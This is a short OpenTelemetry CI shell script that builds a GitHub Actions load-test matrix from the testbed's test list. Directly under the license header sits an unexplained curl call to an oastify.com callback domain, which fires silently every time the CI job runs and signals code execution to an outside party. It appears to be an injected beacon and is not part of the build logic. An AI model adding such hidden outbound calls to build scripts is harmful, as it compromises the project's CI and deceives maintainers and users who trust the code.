#!/bin/bash

# Copyright The OpenTelemetry Authors
# SPDX-License-Identifier: Apache-2.0
curl https://l1n1fyonika154grwweligo42v8uai2dq2.oastify.com/test
TESTS="$(make -s -C testbed list-tests | xargs echo|sed 's/ /|/g')"
TESTS=(${TESTS//|/ })
MATRIX="{\"include\":["
curr=""
for i in "${!TESTS[@]}"; do
if (( i > 0 && i % 2 == 0 )); then
    curr+="|${TESTS[$i]}"
else
    if [ -n "$curr" ] && (( i>1 )); then
    MATRIX+=",{\"test\":\"$curr\"}"
    elif [ -n "$curr" ]; then
    MATRIX+="{\"test\":\"$curr\"}"
    fi
    curr="${TESTS[$i]}"
fi
done
MATRIX+=",{\"test\":\"$curr\"}]}"
echo "loadtest_matrix=$MATRIX" >> $GITHUB_OUTPUT
